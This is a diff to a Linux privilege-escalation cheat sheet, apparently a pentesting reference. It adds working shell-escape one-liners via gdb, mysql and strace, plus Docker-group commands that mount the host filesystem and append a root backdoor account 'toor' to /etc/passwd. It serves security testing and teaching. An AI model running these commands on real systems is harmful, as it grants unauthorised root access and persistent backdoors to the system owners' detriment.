@@ -8,6 +8,7 @@
     ```
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
+- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 
 ## Checklists
 
@@ -81,6 +82,28 @@
   * Checks to determine if we're in a Docker container
   * Checks to see if the host has Docker installed
   * Checks to determine if we're in an LXC container
+
+## GTFOBins
+
+[GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+The project collects legitimate functions of Unix binaries that can be abused to get the f**k break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+
+> gdb -nx -ex '!sh' -ex quit
+> sudo mysql -e '\! /bin/sh'
+> strace -o /dev/null /bin/sh
+
+## Groups
+
+### Docker
+
+Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.
+
+```bash
+$> docker run -it --rm -v $PWD:/mnt bash
+$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+```
+
 
 ## References
 
